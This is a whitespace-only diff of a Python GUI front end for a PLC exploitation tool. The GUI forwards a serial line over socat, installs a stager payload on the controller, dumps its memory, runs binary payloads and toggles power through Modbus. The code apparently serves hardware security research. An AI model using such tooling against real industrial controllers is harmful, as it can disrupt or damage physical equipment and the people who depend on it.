@@ -12,7 +12,7 @@ if script_dir not in sys.path:
     sys.path.insert(0, script_dir)
 
 try:
-    import client
+    import client 
 except ImportError as e:
     print(f"ERROR: client.py not found or failed to import. Ensure it's in the script's directory ({script_dir}) and has no errors. Detail: {e}")
     client = None
@@ -41,7 +41,7 @@ class PLCExploitGUI(QMainWindow):
         self._create_connection_config_group()
         self._create_connection_management_group()
         self._create_dump_memory_group() # Corrected typo from self.dump_mem_group
-        self._create_execute_payload_group()
+        self._create_execute_payload_group() 
         self._create_terminal_outputs_group()
 
     def _create_menu_bar(self):
@@ -141,7 +141,7 @@ class PLCExploitGUI(QMainWindow):
         layout.addWidget(self.dump_output_label, 3, 0)
         layout.addWidget(self.dump_output_path_input, 3, 1)
         layout.addWidget(self.dump_output_browse_button, 3, 2)
-
+        
         # Start Dump Button
         self.start_dump_button = QPushButton("Start Dump")
         self.start_dump_button.setToolTip("Begin the memory dumping process.")
@@ -183,7 +183,7 @@ class PLCExploitGUI(QMainWindow):
         self.program_output_terminal.setLineWrapMode(QTextEdit.WidgetWidth)
         self.program_output_terminal.setFontFamily("Monospace")
         terminal_tabs.addTab(self.program_output_terminal, "Program Output")
-
+        
         # Add a stretch factor to make terminals take up more space if needed
         self.main_layout.addWidget(terminal_tabs, 1) # Add with stretch factor
 
@@ -212,7 +212,7 @@ class PLCExploitGUI(QMainWindow):
             modbus_ip = self.modbus_ip_input.text()
             modbus_port = int(self.modbus_port_input.text())
             modbus_output = int(self.modbus_output_input.text())
-
+            
             self._log_to_program_output(f"Attempting to power ON: {modbus_ip}:{modbus_port} output {modbus_output}")
             if client.switch_power('on', modbus_ip, modbus_port, modbus_output):
                 self._log_to_program_output("Power ON command successful.")
@@ -265,18 +265,18 @@ class PLCExploitGUI(QMainWindow):
 
 
     def _browse_dump_payload(self):
-        self._browse_file("Select Dump Payload File", "./payloads/dump_mem/build/",
-                          "Binary files (*.bin);;All files (*)",
+        self._browse_file("Select Dump Payload File", "./payloads/dump_mem/build/", 
+                          "Binary files (*.bin);;All files (*)", 
                           self.dump_payload_path_input)
 
     def _browse_dump_output(self):
-        self._browse_save_file("Save Memory Dump As", "./",
-                               "Binary files (*.bin);;All files (*)",
+        self._browse_save_file("Save Memory Dump As", "./", 
+                               "Binary files (*.bin);;All files (*)", 
                                self.dump_output_path_input)
 
     def _browse_generic_payload(self):
-        self._browse_file("Select Generic Payload File", "./payloads/",
-                          "Binary files (*.bin);;All files (*)",
+        self._browse_file("Select Generic Payload File", "./payloads/", 
+                          "Binary files (*.bin);;All files (*)", 
                           self.gen_payload_path_input)
 
     # --- socat Process Handlers ---
@@ -310,14 +310,14 @@ class PLCExploitGUI(QMainWindow):
 
         serial_dev = self.tty_combo.currentText()
         forward_port = self.socat_port_input.text()
-
+        
         # Ensure stty settings from start.sh are applied.
         # This might require running stty as a separate command or ensuring socat itself can set these.
         # For simplicity, we assume socat can handle raw params or stty is pre-configured.
         # A more robust solution might run `stty` command first.
         # stty -F ${SERIAL_DEV} cs8 38400 ignbrk -brkint -icrnl -imaxbel -opost -onlcr -isig -icanon -iexten -echo -echoe -echok -echoctl -echoke  -ixon -crtscts -parodd parenb raw
         # socat -v -b 4 -x TCP-LISTEN:1238,fork,reuseaddr ${SERIAL_DEV}
-
+        
         # Basic socat command
         # TODO: Add verbosity and other options from start.sh if necessary
         # socat_cmd = f"socat TCP-LISTEN:{forward_port},fork,reuseaddr {serial_dev},raw,echo=0,b38400"
@@ -354,14 +354,14 @@ class PLCExploitGUI(QMainWindow):
         self._log_to_program_output(f"Starting socat: {program} {' '.join(arguments)}")
         self.socat_output_terminal.append(f"<b>Starting socat: {program} {' '.join(arguments)}</b>")
         self.socat_process.start(program, arguments)
-
+        
         if not self.socat_process.waitForStarted(5000): # Wait 5s for socat to start
             error_msg = self.socat_process.errorString()
             self._log_to_program_output(f"Failed to start socat: {error_msg}")
             self.socat_output_terminal.append(f"<font color='red'><b>Failed to start socat: {error_msg}</b></font>")
             self.socat_process = None # Clear it
             return False
-
+        
         self._log_to_program_output("socat process started.")
         return True
 
@@ -400,12 +400,12 @@ class PLCExploitGUI(QMainWindow):
         # PLC connection logic will be in a thread
         self.status_bar.showMessage("Attempting to connect to PLC...")
         self._log_to_program_output("Starting PLC connection thread...")
-
+        
         # Placeholder for actual connection thread
         # For now, let's simulate success for UI testing purposes
         # In the real version, a QThread will be started here.
         self.connect_button.setEnabled(False) # Disable while attempting
-
+        
         target_host = "localhost" # socat forwards to here
         try:
             target_port = int(self.socat_port_input.text())
@@ -415,27 +415,27 @@ class PLCExploitGUI(QMainWindow):
             return
 
         # Default stager path, can be made configurable later if needed
-        stager_payload_path = client.STAGER_PL_FILENAME
+        stager_payload_path = client.STAGER_PL_FILENAME 
 
         # Create and start the connection thread
         # Ensure any previous thread is not running or cleaned up, though typically not an issue if button logic is correct
         if hasattr(self, 'connection_thread') and self.connection_thread and self.connection_thread.isRunning():
             self._log_to_program_output("Connection attempt already in progress.")
             # Optionally re-enable connect button if it was stuck disabled, or show message
-            # self.connect_button.setEnabled(True)
+            # self.connect_button.setEnabled(True) 
             return
 
         self.connection_thread = PLCConnectionThread(target_host, target_port, stager_payload_path, self)
         self.connection_thread.connection_succeeded.connect(self._handle_plc_connected)
         self.connection_thread.connection_failed.connect(self._handle_plc_connection_error)
-        self.connection_thread.finished.connect(self._on_connection_thread_finished)
-
+        self.connection_thread.finished.connect(self._on_connection_thread_finished) 
+        
         self._log_to_program_output(f"Starting PLC connection thread for {target_host}:{target_port}...")
         self.connection_thread.start()
 
     def _on_connection_thread_finished(self):
         self._log_to_program_output("PLC Connection thread has finished.")
-        # This handler is mostly for cleanup or logging.
+        # This handler is mostly for cleanup or logging. 
         # UI state should be primarily managed by _handle_plc_connected and _handle_plc_connection_error.
         # If the connect button is still disabled AND we are not connected, it means the thread might have
         # exited without emitting a success/failure signal properly or was interrupted.
@@ -449,7 +449,7 @@ class PLCExploitGUI(QMainWindow):
         self._log_to_program_output(f"Thread: PLC Version: {version_str}")
         self._log_to_program_output(f"Thread: Stager installed.")
         self.status_bar.showMessage(f"Connected to PLC. Version: {version_str}. Stager installed.")
-
+        
         self.disconnect_button.setEnabled(True)
         self.connect_button.setEnabled(False) # Keep connect disabled
         self.start_dump_button.setEnabled(True)
@@ -461,7 +461,7 @@ class PLCExploitGUI(QMainWindow):
         if self.client_instance: # Should be handled by thread, but good practice
             self.client_instance.disconnect()
             self.client_instance = None
-
+        
         self.connect_button.setEnabled(True) # Re-enable connect button
         self.disconnect_button.setEnabled(False)
         self.start_dump_button.setEnabled(False)
@@ -487,29 +487,29 @@ class PLCExploitGUI(QMainWindow):
         if self.client_instance:
             try:
                 # Ask user if they want to send 'bye' or just disconnect
-                reply = QMessageBox.question(self, 'Confirm Disconnect',
+                reply = QMessageBox.question(self, 'Confirm Disconnect', 
                                            "Send 'bye' command to PLC to allow normal boot?",
-                                           QMessageBox.Yes | QMessageBox.No | QMessageBox.Cancel,
+                                           QMessageBox.Yes | QMessageBox.No | QMessageBox.Cancel, 
                                            QMessageBox.Yes)
 
                 if reply == QMessageBox.Cancel:
                     self.status_bar.showMessage("Disconnect cancelled.")
                     return
-
+                
                 if reply == QMessageBox.Yes:
                     self._log_to_program_output("Sending bye() command to PLC...")
                     if self.client_instance.send_bye():
                         self._log_to_program_output("bye() command sent successfully.")
                     else:
                         self._log_to_program_output("Failed to send bye() or unexpected response.")
-
+                
             except Exception as e:
                 self._log_to_program_output(f"Error sending bye: {e}")
                 self._show_message("Disconnect Error", f"Error during bye command: {e}", "error")
             finally:
                 self.client_instance.disconnect()
                 self.client_instance = None
-
+        
         self._stop_socat() # Always stop socat on disconnect
 
         self.status_bar.showMessage("Disconnected.")
@@ -536,15 +536,15 @@ class PLCConnectionThread(QThread):
     def run(self):
         try:
             self.parent_gui.client_instance = client.PLCInterface(self.host, self.port)
-
+            
             if not self.parent_gui.client_instance.connect():
                 self.connection_failed.emit(f"Socket connection failed to {self.host}:{self.port}.")
                 return
 
             self.parent_gui._log_to_program_output(f"Thread: Socket connected to {self.host}:{self.port}. Attempting handshake...")
-
+            
             # Brief pause for socat to be fully ready (already done in _connect_plc before starting thread)
-            # time.sleep(0.2)
+            # time.sleep(0.2) 
 
             success, greeting = self.parent_gui.client_instance.perform_handshake()
             if not success:
@@ -552,10 +552,10 @@ class PLCConnectionThread(QThread):
                 self.parent_gui.client_instance = None
                 self.connection_failed.emit(f"Handshake failed: {greeting}")
                 return
-
+            
             greeting_hex = greeting.hex() if greeting else "N/A"
             version_str = self.parent_gui.client_instance.get_plc_version()
-
+            
             if not os.path.exists(self.stager_payload_path):
                 self.parent_gui.client_instance.disconnect()
                 self.parent_gui.client_instance = None
@@ -564,10 +564,10 @@ class PLCConnectionThread(QThread):
 
             with open(self.stager_payload_path, "rb") as f:
                 stager_code = f.read()
-
+            
             self.parent_gui._log_to_program_output(f"Thread: Installing stager ({len(stager_code)} bytes)...")
             self.parent_gui.client_instance.install_stager_payload(stager_code)
-
+            
             # If all successful
             self.connection_succeeded.emit(version_str, greeting_hex)
 
@@ -635,17 +635,17 @@ class PLCConnectionThread(QThread):
     def _autodetect_devices(self):
         self._log_to_program_output("Autodetecting serial devices...")
         self.tty_combo.clear()
-
+        
         # Common patterns for serial devices on Linux
         # For Windows, it would be "COM1", "COM2", etc.
         # For macOS, it's often /dev/tty.usbserial-* or /dev/tty.usbmodem-*
-
+        
         # Simple glob-based detection for Linux
         import glob
         potential_devices = []
         for pattern in ["/dev/ttyUSB*", "/dev/ttyACM*", "/dev/ttyS*"]:
             potential_devices.extend(glob.glob(pattern))
-
+        
         if not potential_devices:
             self._log_to_program_output("No common serial devices found automatically. Please enter manually if needed.")
             self.tty_combo.addItem("") # Add a blank item
@@ -653,7 +653,7 @@ class PLCConnectionThread(QThread):
             for device in sorted(list(set(potential_devices))): # Sort and unique
                 self.tty_combo.addItem(device)
                 self._log_to_program_output(f"Found: {device}")
-
+        
         self.status_bar.showMessage(f"Device detection complete. Found {len(potential_devices)} potential devices.")
 
     def _create_power_supply_group(self):
